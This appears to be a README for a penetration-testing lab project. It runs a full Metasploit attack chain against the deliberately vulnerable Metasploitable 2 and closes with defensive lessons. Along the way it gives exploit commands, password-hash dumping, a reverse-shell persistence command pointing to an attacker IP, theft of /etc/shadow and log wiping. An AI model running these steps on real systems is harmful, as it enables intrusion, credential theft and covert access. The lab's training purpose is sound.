# Metasploit-Attack-Defence-Simulation

### Full Exploitation --> Privilege Escalation --> Persistence --> Defensive Cleanup
---

## Project Overview

This project demonstrates a real-world penetration testing scenario using the **Metasploit Framework**.

The project showcases a **complete attck chain** which includes:

- Reconnaissance
- Vulnerability identification
- Exploitation
- Meterpreter post-exploitation
- Privilege escalation
- Persistence installation
- Data exfiltration demonstration
- Cleanup and defensive considerations

The project highlights both **offensive and defensive security understanding** and shows the lifecycle of a cyberattack.

---

## Lab Setup

#### **Attacker Machine**

- **Kali Linux**
- **Tools used**

      - Metasploit
      - Nmap
      - Bash
      - Meterpreter

#### **Target Machine**

- **Metasploitable 2**
- *It is intentionally vulnerable for research and has multiple outdated services which is perfect for real attack simulation.*

#### **Network Mode** (*used virtual box*)

- Both machines must have a shared network: `Bridged Adapter` or `Host-Only-Adapter`

## PHASE 1 -- Reconnaissance

Reconnaissance helps identify **open ports**, **running services**, and **potential vulnerabilities**.

This phase shows how real attackers gather intel before attcking.

1.1 **Discover Target IP**

`sudo netdiscover -r 192.168.1.0/24`

- This scans your local network range and discovers all the active hosts
- This will help identify the target machine

1.2 **Full Nmap Scan**

`nmap -A -T4 -p- 192.168.1.105 -oN nmap-scan.txt`

- **-A** --> Aggressive scan (OS detection, services, scripts)
- **-T4** --> Speed level
- **-p-** --> Scan all 65,535 ports
- **-oN** --> Save output to a file

***This gives a complete attack surface map***

*The outdated services gives an open door for attackers*
***THis is why organizations should always patch, upgrade, and disable unused services***


---

## PHASE 2 -- Vulnerability Mapping

In this stage we interpret the Nmap results.

#### **Main vulnerability**

**VSFTPD v2.3.4 which contains an intentionally planted backdoor**

When a user logs in with a username ending in `:)`, the daemon spawns a reverse shell on port 6200.

*This vulnerability:*

- does not require authentication
- allows immediate remote command execution
- it has been labeled as **critical** by CVE databases

---
## PHASE 3 -- Exploitation with Metasploit

3.1 **Start Metasploit** `msfconsole`

3.2 **Search for the exploit** `search vsftpd`

3.3 **Use this module** `use exploit/unix/ftp/vsftpd_234_backdoor`

3.4 **Set the target IP**
```
set RHOSTS 192.168.1.105
set RPORT 21
run 
```
---
PHASE 4 -- Post-Exploitation (Meterpreter)

*Once inside as an attacker you can elevate access.*

4.1 **System Enumeration**
```
sysinfo
getuid

```
This shows:  - Operating System (OS)
             - the Kernel version
             - current user privileges

4.2 **Enumerate Users**

`run post/linux/gather/enum_users`

*This helps in knowing the user accounts which will help to map privilege escalation paths.

4.3 **Dump Password Hashes**

`hashdump`

- this enables cracking of hashes offline
- use them for lateral movement
- shows total compromise

---

## PHASE 5 --Privilege Escalation

Use Metasploit's built-in suggester which will scan the kernel and system and suggets working privilege escalation exploits:

```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Example:

```
use exploit/linux/local/dirty_cow
set SESSION 1
run
```

*Privilege escalation turns partial access to full root control*.

---

## PHASE 6 -- Persistence Installation

*This part will help maintain access for future use.*

`run persistence -U -i 10 -p 4444 -r 192.168.1.100`

- **-U** --> Start on user login
- **-i 10** --> Reconnect every 10 seconds
- **-p 4444** --> Port for reverse shell
- **-r** --> Attacker's IP address

*Backdoors like these are how long-term breaches happen like Advanced Persistence Groups*
---

## PHASE 7 -- Data Exfiltration Demonstration

*Data exfiltration is the goal of most attacks.*
*Download the sensitive files*:

`download /etc/shadow loot/shadow.txt`

---

PHASE 8 -- Cleanup and Defensive Awareness

Delete the persistence script: `rm /tmp/persistence.sh`

Clear logs (this will be only for demonstration): `echo "" > /var/log/auth.log`

*Attackers always try to cover their tracks, it is upto the defenders to watch for anomalies such as missing logs*
---

## Lessons Learned

1. **Patch management is critical** - old services like vsftpd pose a greater risk
2. **Defense-in-depth is needed in organizations** - this would ensure if one service fails, leyered security helps detect intrusions
3. **Logging and Monitoring is always essential** - blue teams must detect abnormal connections and missing logs
4. **Persistence mechanisms are the real threats** - some of the modern APTs maintain long-term hidden access
5. **Penetration testing must be continuous** - one time scan is not enough as the attack surface always evolve
6. **Privilege escalation is possible when attackers have access to system** - once inside the system, attckers do not stop at user level access they can do horizontal or vertical privilege escalation


---

## Author Information

**Cleveland Henry Lore**

Cybersecurity Enthusiast | Penetration Testing
---

## License

*THis project is open-source and distributed under the **MIT license.**

*See the **LICENSE** file for details.*

